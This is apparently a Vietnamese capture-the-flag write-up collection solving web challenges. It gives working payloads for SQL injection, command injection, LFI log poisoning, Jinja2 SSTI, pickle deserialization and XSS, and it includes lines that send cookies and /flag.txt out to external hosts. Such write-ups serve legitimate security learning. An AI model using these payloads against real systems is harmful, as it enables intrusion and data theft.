# Cookie Hân hoan (Web hacking)
`capy3ra`

- [Baby Address Note](#baby-address-note)
- [Baby ping](#baby-ping)
- [Simple SQLi](#simple-sqli)
- [Hello Session](#hello-session)
- [Duplicate Content](#duplicate-content)
- [Baby Logger Middleware](#baby-logger-middleware)
- [Ethical Ping Pong Club](#ethical-ping-pong-club)
- [Baby JS Fck](#baby-js-fck)
- [Cookie and Milk](#cookie-and-milk)
- [File Download](#file-download)
- [Password Reset](#password-reset)
- [Baby Strcmp](#baby-strcmp)
- [PHP Inclusion to RCE](#php-inclusion-to-rce)
- [Time](#time)
- [Password Disclosure](#password-disclosure)
- [File upload via PUT method](#file-upload-via-put-method)
- [Baby OS Path](#baby-os-path)
- [Simple Blind SQL Injection](#simple-blind-sql-injection)
- [Logger Middleware](#logger-middleware)
- [Blind Logger Middleware](#blind-logger-middleware)
- [HTML to PDF](#html-to-pdf)
- [Command Limit Length](#command-limit-length)
- [Brute-force Basic Authentication](#brute-force-basic-authentication)
- [Neonify](#neonify)
- [Baby Crawler](#baby-crawler)
- [Likeness](#likeness)
- [Easy SSRF](#easy-ssrf)
- [XXE-Injection](#xxe-injection)
- [Simple SSTI](#simple-ssti)
- [PHP Inclusion](#php-inclusion)
- [Nginx Alias](#nginx-alias)
- [Steal Cookie](#steal-cookie)
- [Escape the session](#escape-the-session)
- [SVATTT 2016 Quals Curl](#svattt-2016-quals-curl)
- [Baby Waiter](#baby-waiter)
- [Ping 0x02](#ping-0x02)
- [Todo Application](#todo-application)
- [Unzip me now](#unzip-me-now)
- [The Existed File](#the-existed-file)
- [Break The Editor Jail](#break-the-editor-jail)
- [Memo Baby CSRF](#memo-baby-csrf)
- [PHP có làm em lo lắng](#php-có-làm-em-lo-lắng)
- [Under Construction](#under-construction)
- [The JWT Algorithm](#the-jwt-algorithm)
- [Baby Assert](#baby-assert)
- [Code get Flag](#code-get-flag)
- [SVATTT 2016 Quals Curl](#svattt-2016-quals-curl)
- [Spookifier](#spookifier)
- [Request Bin](#request-bin)
- [Baby Pielily](#baby-pielily)
- [Crawling](#crawling)
- [Evaluation Deck](#evaluation-deck)
- [Insufficient blacklisting file types](#insufficient-blacklisting-file-types)
- [Magic Login Harder](#magic-login-harder)
- [Obfuscating file extensions](#obfuscating-file-extensions)
- [Compiler as a Service](#compiler-as-a-service)
- [Empty execution](#empty-execution)
- [Baby Old Preg Voodoobug](#baby-old-preg-voodoobug)
- [SQL Truncation Attack](#sql-truncation-attack)
- [Baby Simple Go CURL](#baby-simple-go-curl)
- [The Evil Assignment on Canvas](#the-evil-assignment-on-canvas)
- [Baby Sqlite with filter](#baby-sqlite-with-filter)

## Baby Address Note

1. Dựa vào source code biết được bài này là sql injection. Với câu truy vấn `f"SELECT * FROM users WHERE uid='{uid}';"` ta có thể bypass bằng `' OR '1'='1' --`
2. Khi thử 2 câu truy vấn bằng dấu ; thì nhận được message lỗi là chỉ cho phép 1 câu truy vấn.
3. Được biết db dùng sqlite3 nên ta sẽ dùng union select tới bảng sqlite_master để xem danh sách các bảng trong sql
```
' UNION SELECT sql,name,tbl_name from sqlite_master --
```
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/d695da1d-c61d-4f32-a065-856eccfe8c13)
4. Nhận thấy bảng chứa flag. Lấy flag bằng ``' UNION SELECT 1,2,flag from flag_9AbM4 --``

## Baby Ping

1. Ở bài này, trang web không lọc input mà đã chuyển xuống hẹ thoogsn-> Command Injection 

2. Payload: ``127.0.0.1";cat /flag.txt;echo "`` thì câu lệnh hoàn chỉnh sẽ là ``ping -c 3 "127.0.0.1";cat /flag.txt;echo""``

![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/fba14ada-fb88-4dc5-b625-5b3ea412a5d9)

## Simple SQLi

1. Trong source code cho biết là table user được thêm vào các user guest và admin có userid = guest và userlevel = 0
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/74da77aa-b784-4ad2-b893-46b11280bd4d)
2. Tuy nhiên khi enter userlevel = 0 thì nó chỉ hiển thị record đầu tiên là guest (Nếu có 2 record có cùng giá trị userlevel thì code chỉ xử lý reocrd đầu tiên)
3. Payload: ``0' AND userid = 'admin' --`` để câu truy vấn trở thành ``select * from users where userlevel='0' AND userid = 'admin' --'``
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/f2d2bd35-793b-4f40-9223-4a261141df7e)

## Insecure Download File

1. Khi lần đầuu down transcript ta thấy file down về là 2.txt.
2. Thử đọc file 1.txt thì có được flag

## Hello Session

1. Trong source code có thấy một endpoint khả nghi ``/manager``
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/94241d61-58ec-491b-a45e-bab97b7719de)

2. Truy cập endpoint đó thì nhận đưuọc session của admin
3. Thay sessionid

## Duplicate Content

1. Ở bài này người dụng có chắc năng clone lại bài viết của mình. Tuy nhiên ở đây do lỗi Unauthorized nên từ tk guest có thể clone lại bài viết của người dùng khác.
2. Brute force GET /clone?id=$1$ để clone lại tất cả các bài viết trên trang blog về tài khoản guest rồi tìm flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/429fdb86-a166-4d6c-a2e6-d540868d06df)
3. Trở lại trang chủ thì thấy flag ở blog_id = 22

## Baby Logger Middleware

1. Mục tiêu của bài là cố inject vào cột ip_addr trong access log lưu trên database
2. Khi thử chèn các header như `X-Forwarded-For` không được
3. Thử sqli thì nhận được lỗi và detect sqli
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/880e9167-9f9b-4e1b-a86b-5feb04638169)
4. Thì error message ta biết được caauu insert là `INSERT INTO logger (ip_address, user_agent, referer, url, cookie, created_at) VALUES ('***', 'manhcuon','none','none','none','none')`
5. Insert thêm record có id_addr bằng `HACKER_WAS_HERE`
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/e7ce732d-daf4-4df6-9416-3d6d5e4a0253)

## Baby JS Fck

1. Trong bài ta có một đoạn code xử lý đăng nhập như sau:
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/e3807bc2-60c8-4b74-b4f3-adb05cf9afdd)
2. Bật Inspect vào source nhận thấy có 4 file js bị obfuscation
3. Vào console nhập hàm verify ta có username và password
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/bc322b8a-633e-417e-97b6-54ef0f8e9fcc)
4. Còn hàm verifyRole thì là một hàm xử lý trong các giá trị trong js mà khi giải được ta có input là `@mdiN` thì sẽ trả về giá trị true
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/b7c7d1b8-5c56-418b-beba-706c4cb361a8)
5. Thông tin đăng nhập
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/30dd278a-c573-49ee-b825-2d78f265a7c8)
6. Hoặc có thể decode js fck language ở trang [này](https://enkhee-osiris.github.io/Decoder-JSFuck/)
7. Tuy nhiên khi nhập thông tin đăng nhập đúng nhưng vẫn không thấy endpoint GET /check.php trả lại bất cứ thứ gì.
8. Nhận ra rằng khi nhập trên trình duyệt các ký tự như `@` sẽ bị encode. Do đó ta sẽ gửi request bằng burp
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/bfd0b011-5f6a-401c-aeac-407d8fe2fa9f)
9. Lấy được flag

## Cookie and Milk

1. Bài này được cung cấp source php khi chúng ta truy cập vô challenge
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/ae385a0c-9c29-4e69-bf59-187bba998c42)
2. Function `extract` để lấy tất cả các tham số mà chúng ta đưa vào bằng GET method. (vuln đầu tiên của bài này cũng ở đây). Giải thích về hàm này thì khi chúng ta truyền các tham số thì sẽ ghi đè được các biến internal.
3. Ngoài ra ở dưới bài dùng "==" để so sánh 2 giá trị hash gây ra vuln thứ 2 loose comparison.
4. Tuy nhiên nó không cho phép 2 giá trị này bằng nhau nên ta sẽ lấy payload ở [đây](https://github.com/spaze/hashes/blob/master/sha1.md)
5. Payload: `https://cookie-and-milk-2e70038f.dailycookie.cloud/?_SESSION[magic]=aaroZmOk&_COOKIE[magic]=aaK1STfY`
6. Nhận được flag
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/1c5c6170-0b35-43af-8f65-f2bcf561783e)

## File Download

1. Upload file text nhưng không thể inject html do < > đã bị encode
2. Sau khi upload một file thứ path travelsal thì nhận thấy site bị dính vuln này

## Ethical Ping Pong Club

1. Có thể xác định luon từ đầu bài này chứa vuln os command inject
2. Khi thử các Chaining commands như `; & && | || ` đều không được
3. Thử với xuống dòng thì inject thành công
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/91aab036-8ccb-43d0-9fcf-f870e0fab417)
4. Cat flag.txt nhưng bài filter dấu space.
5. Bypass space bằng dấu `<`.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/c3e6e6a1-a489-49d5-941b-e0399e9d6038)

## Password Reset

1. Bài này có chức năng reset password chứa lỗ hổng.
2. Khi gửi post request reset-password thì server sẽ lấy giá trị host để generate ra link reset password.
3. Lợi dụng điều đó chèn host header tới host ta kiểm soát với email của admin
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/969d0a38-bc63-4480-8597-29c641370340)
4. Sau đó vào burp collaborator nhận được token
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/8e3f627b-f93d-484a-852c-829d3f6c830b)
5. Đổi mk rồi login vào account admin lấy flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/b696cb93-e5b7-4aee-b422-6e7bde73a69c)

## Baby Strcmp

1. Ở bài này web so sánh giá trị param flag truyền vào với secret key trên server bằng hàm strcmp
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/0b71e88a-9a0d-479b-93d0-776b1bacd30d)
2. Research ra được cách bypass hàm strcmp bằng cách truyền một mảng rỗng vào param flag. Để rồi trong php strcmp nó coi nó là giá trị NULL và == 0 trả về true
3. Sửa request
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/e758a349-8ab9-40d6-89ec-aaedb6cb54a7)

## PHP Inclusion to RCE

1. Bài này bị dính LFI.
2. Có thể bypass traversal sequences stripped non-recursively bằng cách dùng payload
`?file=...//....//....//etc/passwd`
3. Đọc được file log của nginx.
4. Tiến hành LFI to RCE via log poison.
5. Gửi request với user-agent với mã php malicious
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/7a37e143-251a-4489-a915-68b44fd878fe)
6. Đọc thành công các file ở thư mục root
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/da43aabf-0698-45d5-a118-12e7f8f0ad89)
7. Đọc file flagOqfu8.txt để lấy flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/31c8d137-8d6f-4682-86d3-c165afca3897)

## Time

1. Dễ thấy bài này bị dính command injection.
2. Command được sử dụng trong bài có vẻ là `date +'format'` với param format được lấy trên url
3. Sau khi thử test một vài payload thì nhận thấy có vẻ như sau khi tham số format được truyền vào thì sẽ thêm `';` vào cuối câu lệnh trước khi truyền vào hàm thực thi.
4. Đây là đoạn xử lý trong model.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/1ef329d7-7229-4019-bb24-879cbd3b9e80)
5. Tuy nhiên khi dùng dấu `#` để comment thì vẫn không nhận dược kết quả như mong muốn.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/9a114b97-d1ab-4b7c-bf53-b0aff1cbd41e)
6. Encode `#` thành `%23` thì bypass thành công. Có lẽ là do trình duyệt cho rằng `#` khai báo fragment

## Password Disclosure

1. Ở bài này chúng ta có source code.
2. Fuzz 1 vòng trang web nhận thấy lỗi disclosure ở trang reset password khi mà nó đắt giá trị password hiện tại vào ô input. Như vậy chỉ cần gửi được request reset-password cho admin thì ta sẽ có được mk của admin.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/5d06d98f-6fb2-4b5a-a9d1-32fcd5a78d47)
3. Nhận thấy trong source code đoạn xử lý GET request reset-password thì nó cho phép lấy 2 phương thức. 1 là như mặc định là lấy session của user. 2 là thông qua param username -> Từ đó nhận ra ta có thể bypass nó.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/926ff9f8-1bde-4c87-96a6-7bfbaa2269d0)
4. Có được password -> login vào lấy flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/d9083982-e26f-4d9d-b9c3-afc268ca931f)

## File upload via PUT method

1. Theo đề bài thì ta có thể upload bằng PUT method.
2. Thử upload file PUT `test2.php` để xem thông tin php
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/f8bcda98-31ed-4f66-941f-15e6d67ec359)
3. Thành công
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a28b12f5-50bc-4c18-b147-239694fa9a79)
4. Thực thi câu lệnh ls / qua php
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/839dba85-c4d9-4a2a-a6e1-4143756a8870)
5. Lấy flag qua flag.txt
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/1ae3be8b-cb55-4625-b02c-e5404f1953ae)

## Baby OS Path

1. Bài này có cho ta source code. Nhận thấy rằng flag.txt nằm ở root directory.
2. Trong đoạn code xử lý GET path dùng hàm `os.path.join` với tham số thứ nhất được set là thư mục `statics`.
3. Tuy nhiên ta có thể bypass hàm này bằng cách truyền thẳng vào đường dẫn tuyệt đối như sau:
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/2f194204-70fe-4f2b-b76a-9a58254a15e1)
4. Từ đó khai thác bằng cách truy cập path `http://103.97.125.53:31565//flag.txt`
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/377c4cfb-bcd0-4708-9692-b6d64d41ddb1)

## Simple Blind SQL Injection

1. Ở bài này chúng ta có lỗi Blind SQLI, kết quả trả về chỉ trả về lỗi (ví dụ như sai syntax hay query một cột không có trong bảng...) hoặc nếu câu query trả về true thì nhận exists còn không thì trả về not found.
2. Sử dụng `substring admin' AND SUBSTRING((SELECT sql FROM sqlite_master WHERE tbl_name = 'users'), 20, 1) = '('--` để lấy câu truy vấn sql tạo bảng users. Như một câu điều kiện để xác định từng ký tự một :((. Bằng cách brute-force các ký tự. Hết cách :((.
3. Sau 1 tỷ lần thử thì ta tìm được tên cột chứa password là `upw` từ câu query không đầy đủ.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/bf45ed8e-6c82-45a3-b746-3886a7a7559c)
4. Tiếp tục brute force password bằng `admin' AND SUBSTRING((SELECT upw FROM users WHERE uid='admin'), 2, 1) = '0'--` có được password là `y0u_4r3_4dm1n`.
5. Đăng nhập lấy flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/737da063-7ff1-4632-8b7e-9598dad3c61b)

## Logger Middleware

1. Trang web được cho sẽ lưu lại access log vào db rồi hiển thị lại cho client.
2. Ở đây do không thể nhập đầu vào, nên ta sẽ sử dụng header attack vào Header `User-Agent` để có thể truyền input vào log.
3. Sau khi gửi request tới header `User-Agent: cuong',)` ta nhận được một lỗi sql và cho biết câu lệnh insert log.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/cadae0a5-da1a-47fa-9b97-00bc3d8fd1a4)
4. Đặt các giá trị cho các trường con lại và để dấu comment ở cuối. Nhận thấy rằng ta đã có thể insert log thành công.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/e8b9b2e3-8553-4a21-a51a-3ba58f77a8bc)
5. Sử dụng payload `User-Agent: cuong','None','None','None','None') UNION SELECT name,1,2,3,4,5 FROM sqlite_master WHERE type = 'table';--` để lấy tên các bảng trong database thông qua UNION query (Bởi trang không cho phép chạy 2 câu lệnh một lúc)
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/1fc84abc-1e2b-4054-b0e1-94f4f18bcd1c)
6. Biết được flag nằm trong bảng flag. Dùng payload `User-Agent: cuong','None','None','None','None') UNION SELECT  sql,1,2,3,4,5 FROM sqlite_master WHERE tbl_name = 'flag';--` để lấy câu truy vấn tạo bảng flag -> Có được cột chứa flag `secr3t_flag`
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/d18acbf2-1974-483d-9cfb-3a1a6c077b9f)
7. Query lấy flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/f4512f15-56a0-4b32-9941-818a19c16394)

## Blind Logger Middleware

1. Bài này có chắc năng giống như bài [Logger Middleware](#logger-middleware) nhưng chỉ có chức năng hiển thị xem truy cập đã được log lại chưa và không hiện thị access log.
2. Khi thử payload tạo lỗi syntax trong sql thì nhận được thông báo `Error`
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/03aece90-7c68-48b2-8a44-d70dd5bd12cd)
3. Còn khi truyền đủ các biến giá trị và comment phần thêm sau của câu truy vấn thì nó đã được log thành công. Vậy có thể thấy rằng đây là blind sql nên ta chỉ có thể tìm flag bằng các condition query.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/8a1e21f5-1cc1-4faa-9444-525526e5ba72)
4. Ta dùng func CASE để tạo câu điều kiện.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/ba3b137d-0f77-4ba2-91b6-6a9f3a86f2a7)
5. Để có thể nhận biết biểu thức truyền vào là đúng hay sai ta sẽ dùng function load_extension cụ thể payload dạng như sau `cuong','None','None','None',CASE WHEN  1=1 THEN 2 ELSE load_extension(1) END);--` ở đây khi truyền vào biểu thức đúng thì response trả về Logged còn khi biểu thức sai thì gọi đến hàm load_extension(1) mà giá trị 1 không xác định nên response trả về Error.
6. Xác định các bảng và cột chứa flag. Xác định bảng chứa flag là `flag`
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/547a9051-dbbe-4c54-be55-879b92d276d3)
7. Để lấy được tên cột của bảng flag ta sẽ vừa brute-force vừa đoán các ký tự trong câu lệnh sql tạo ra bảng flag với payload `cuong','None','None','None',CASE WHEN  ((substr((SELECT sql from sqlite_master WHERE tbl_name="flag"),1,1))='C') THEN 1 ELSE load_extension(1) END);--` (Dùng intruder)
8. Sau một thời gian mò từng ký tự, ta đọc được sương sương câu truy vấn có dạng. Cột chứa flag có lẽ là cột secret.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/5fdb2a33-4d90-4330-8250-7e168f1b1187)
9. Tiếp theo là brute-force flag có dạng CHH{} với 30 ký tự. Payload `cuong','None','None','None',CASE WHEN  ((substr((SELECT secret from flag),2,1))='H') THEN 1 ELSE load_extension(1) END);--`
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/ab92f7e7-ac5b-47c4-b3ac-912ca9306550)

## HTML to PDF
### Ref

1. Bài này web có tính năng convert từ html sang pdf. Sau khi fuzz thì detect được rằng web dùng api của trang [weasyprint.org](weasyprint.org). Và được encode FlateDecode.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/cf640b6f-8a5f-4a9b-aaff-973940b5d7d2)
2. Ta sẽ tạo một host với payload `<link rel=attachment href="file:///etc/passwd">`.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a3c4b793-52b9-4a37-bea6-0f79776c71c5)
3. Sau đó sử dụng script [này](gist.githubusercontent.com/averagesecurityguy/ba8d9ed3c59c1deffbd1390dafa5a3c2/raw/cf89a69253f3618605025f9918f3b08677b879c3/pdf_flatedecode.py) để đọc FlateDecode stream.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/c8b7b990-3b18-4ece-a511-0d73583ccb7c)
4. Đổi payload thành `<link rel=attachment href="file:///flag.txt">`.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/56b96ff2-ae61-4b1a-9376-a0e05edfa7cf)

## Command Limit Length

1. Bài này cho phép rce nhưng lại giới hạn input < 5 ký tự.
2. Thử một vài câu lệnh ngắn như `dir` thì được.
3.  Dựa vào một [bài1](https://github.com/bennofs/docs/blob/master/hitcon-2017/baby-first-revenge2.md) [bài2](https://mengsec.com/2018/10/31/HITCON-2017-babyfirst-revenge-v1-v2/) để khai thác giới hạn ký tự (4, 5 ký tự).
4.  Tuy nhiên ở chal này, khá may mắn vì file flag được đặt đầu trong thư mục
5.  Ta sẽ thêm file `cat` bằng payload `>cat` để tạo file cat ở thư mục hiện tại.
6.  Dùng `*` để thực thi `cat  flagdUWZd.txt  index.php  static`. 
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/1c92cc7c-5f79-4fdd-9b54-ab1f301662d1)
7. Lấy được flag
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/3d8148f8-538e-4e05-a637-e255e025c8d9)


## Brute-force Basic Authentication

1. Brute-force popup đăng nhập bằng hydra.
2. Command: `hydra -l admin -P passwords.txt http-get://103.97.125.53:31445`. Với wordlist passwords.txt lấy từ simple list trong burp suite
3. Kết quả có được username:password hợp lệ.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/6f18c3f0-3c86-4d5f-b2d9-ff5f15910dd5)
4. Nhập vào thông tin đăng nhập `admin:iloveyou`. Lấy được flag từ response header
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/c8efb32e-67e1-4ea5-9e27-5e001aef7e02)

## Neonify

1. Ở bài này, ta detect được là website sử dụng ruby và erb template nhưng khi thử các payload ssti cho erb hoặc đơn giản các ký tự để ssti đều bị trả về message `Malicious detect`.
2. Và ta có source có đoạn xử lý đầu vào param `neo` như sau:
```
post '/' do
  if params[:neon] =~ /^[0-9a-z ]+$/i
    @neon = ERB.new(params[:neon]).result(binding)
  else
    @neon = "Malicious Input Detected"
  end
  erb :'index'
end
```
3. Tức là ở đây họ dùng regex để lọc và chỉ cho phép chứa các ký tự số và a->z.
4. Ta có thể bypass regex trên bằng cách xuống dòng cho đầu vào.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/7bcd249c-bc17-459b-860e-5c268a34d221)
5. Nhưng khi gửi requeset thì lại dính 400. Ta sẽ url encode payload đằng sau. Và thành công lấy được flag ở `/flag.txt`
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/78598ffb-d47f-409d-9835-eb9dca1af962)
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/fe89d6df-5e80-406e-8aa5-42326733b2d2)

## Baby Crawler

1. Bài này có chức năng crawl một trang web về rồi lưu vào file trên server, endpoint `?debug` cho chúng ta biết source code
2. Trong source code chú ý đoạn xử lý input vào của tham số url.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/613df02d-39d4-4a7e-8411-50c7d9b5e6ab)
3. Ta nhận thấy tham số url trước khi được truyền vào hàm shell_exec thì đã được filter các ký tự nhằm ngăn chặn command injection -> Do đó ta không thể injection bằng cách kết thúc câu lệnh curl rồi thực hiện câu lệnh khác được.
4. Như vậy phải tìm cách injection thẳng vào command curl. Được biết curl có một option -F cho phép gửi file trong http request. Ta sẽ craft một payload để curl gửi file chứa flag tới 1 host mà ta kiếm soát.
`http://103.97.125.53:30244/ -F file=@/flag.txt https://eoxgnbd07mhnjeq.m.pipedream.net`
5. Trên pipedream ta có thể băt được request chứa url tới file được gửi từ phía server. Mở ra thì lấy được flag.

## Likeness

1. Bài này cho ta biết ở `/source` có chứa source code.
2. Đọc qua source, ta có thể nhận ra một vài điều.
- `@limiter.limit("5/second")`: Giới hạn số request đến server
- `res = cur.execute("SELECT * from authors where last LIKE ?", (request.args['lastname'].replace("%", ""),))`: xử lý tham số đầu vào và thực hiện câu query truy xuất csdl. Đặc biệt là ở đây sử dụng `?` để replace nên không thể chèn dấu "". Ngoài ra cũng loại bỏ ký tự `%`.
- Và một đoạn insert các record vào db trong đó record cuối có chứa flag.
3. Nhận thấy trong LIKE operator có 2 wildcards là `%` và `_` thì dấu `_` chưa bị filter. `_` trong LIKE SQL dùng để thay thế cho một ký tự trong string đó.
4. Ta có thể sử dụng nó để brute-force số ký tự của flag. với format flag.
5. Trước tiên generate các payload bằng.
```
for i in range(1, 101):
    print("CHH{{}".format("_" * i)+"}")
```
6. Khi truy xuất đúng record. ta sẽ nhận được flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/819b0e17-b780-47f0-84fe-bb3d9eb0927e)

## Easy SSRF

1. Ở bài này, endpoint `img_viewer` nhận url đầu vào rồi generate ảnh từ link đó.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/1eac35c0-d7be-447e-ab01-f12a303f187e)
2. Nhận thấy có thể truyền bất kỳ ảnh nào không chỉ ở local
3. Được biết bài này blacklist localhost và 127.0.0.1 và internal web server chạy trên các port từ 1500-1800. Thử bypass blacklist bằng `127.1` đồng thời brute-force port. Với payload.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/4824e7dd-4ee1-4a8b-97c7-1428facf2105)
4. Kết quả nhận đưuọc một chuỗi b64 encode
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/6c6ab536-a876-4724-86b3-fbe06ab5846a)
5. Decode thì có được flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a6b3fb91-9ce8-4ac1-a01b-4c410a24b05e)

## XXE Injection

1. Dùng payload php filter
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/c11007dc-612f-41a1-96c6-cbb91165647a)
2. Inject vào file upload mẫu ta chèn được vào xml.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/e13c7412-73d4-4299-baaf-cc9a91c37e40)

## Simple SSTI

1. Trước hết khi truy cập vào trang web nhận thấy rằng có 2 path không liên quan khi truy cập vào đều dính Not found.
2. Vì đề bài cho ta biết đây là ssti nên ta sẽ thử inject thẳng vào url với payload `{{7*7}}` và `{{7*'7'}}` nhận được 2 kết quả lần lượt là `/49` và `7777777`.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/7729e1ac-47d5-4f00-8607-0d6d53e37b70)
3. Từ đó detect ra được rằng server đang dùng template `Jinja2`
4. Thử các payload cho Jinja2 trên payload all the things thì thấy payload `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}` là thành công.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a577146f-40ce-4461-a04c-132ceeb43e43)
5. Thay ls => cat /flag.txt thì lại bị dính lỗi. Nhận thấy có vẻ như là site đã block dấu `/` nên ta sẽ bypass nó bằng cách thay `/` bằng `${HOME:0:1}`.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/21aa37ac-b7b8-40ec-af5f-77d3aa0f486f)
6. Lấy thành công flag.

## PHP Inclusion

1. Đọc qua source code của site ta có thể nhận thấy ở page view ngta đã filter `preg_match('/flag|:/i', $file)` nên rất khó để có thể đọc file flag.php vì nó filter thằng tên file.
2. Nhưng ta nhận thấy là ở page home có đoạn php dùng include `include $_GET['page']?$_GET['page'].'.php':'main.php';`. Ngoài ra ta còn biết là flag.php nằm ở path cụ thể.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/4e9a59fd-d887-43a0-8a06-df9d7b4ec603)
3. Nhưng không thể đọc được flag. Thử b64 encode bằng php filter.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/1ceda422-f7e3-4d44-b2be-2df796e02b36)

## Nginx Alias

1. Truy cập vào site nhận thấy có endpoint `/app/static/welcome.txt` và biết được đây là Nginx Alias Traversal và file `run.py` nằm ở `/app/run.py` tức là có thể traversal với payload `/static../run.py`.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/7920543f-30f8-445e-9019-75191c0f3f30)

## Steal Cookie

1. Ở bài này ta được biết có lỗ hổng xss ở param `param` và ở endpoint flag khi submit url đó thì một admin bot sẽ tự động click vào url đó. Ngoài ra ở endpoint memo sẽ lưu trữ giá trị của param memo vào site.
2. Từ đó ta có thể xây dựng một kịch bản exploit như sau.
3. Gọi đến hàm document.location để redirect đến endpoint memo cùng với giá trị của tham số memo truyền vào là document.cookie.
``<script>document.location='http://13.212.34.169:32510/memo?memo='+document.cookie</script>``
4. Sau khi gửi url đó cho bot. Bot click vào thì memo sẽ lưu giá trị cookie vào endpoint memo.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/deef0004-2328-4b70-b613-a970b8e80c7a)

## Escape the session

1. Từ title của web cho biết đây sẽ là lỗ hổng deserialize
2. Từ source code có được, có thể thấy ở đây ngta serialize object info bằng hàm pickle.dump sau đó encode b64
3. Còn function check session sẽ decode b64 rồi deserialize bằng pickle.loads() .
5. Ta sẽ craft obj payload để đọc file với method __reduce__ (Khi deserialize thì phương thức __reduce__ đó sẽ được gọi với mục đích là tái tạo lại object đó).
6. Payload:
```
import pickle
import base64


class Payload:
    def __reduce__(self):
        command = "open('/flag.txt').read()"
        return (eval, (command,))


payload = {'name': Payload()}

print(base64.b64encode(pickle.dumps(payload)))
#gASVPgAAAAAAAAB9lIwEbmFtZZSMCGJ1aWx0aW5zlIwEZXZhbJSTlIwYb3BlbignL2ZsYWcudHh0JykucmVhZCgplIWUUpRzLg==
```

## SVATTT 2016 Quals Curl

1. Bài này ta có source code
```
<!-- 
// index.php
if (!empty($_POST['url']) && is_string($_POST['url'])){
  if(!filter_var($_POST['url'], FILTER_VALIDATE_URL) === false  && substr($_POST['url'],0,7) === "http://"){
    $url = strtolower(escapeshellarg($_POST['url']));
    $ret = `curl -v $url 2>&1`;
    echo "<p>URL: ".$url."</p>";
    if( !preg_match('/(\.localhost|%|flag)/is',$url,$matches) && !preg_match("/(Connected.*\(172\..*?\))/is",$ret,$matches)) {
      echo "<br /><pre>$ret</pre>";
    } else {
      echo "<font color=Red>Hacker detected [{$matches[1]}]!</font>";
    }
  } else {
    echo "<font color=Red>Invalid URL!</font>";
  }
}
-->

<!--
// flag.php
$ip = $_SERVER['REMOTE_ADDR'];
echo $ip."\n";
if($ip === '127.0.0.1' || $ip === '::1') echo "FLAG_HERE";
-->
```
2. Ở đây ta thấy param `url` được filter để tránh ssrf nhưng nhận thấy ở header User-Agent nhận thấy curl đang dùng phiên bản dính lỗ hổng CVE-2016-8624.
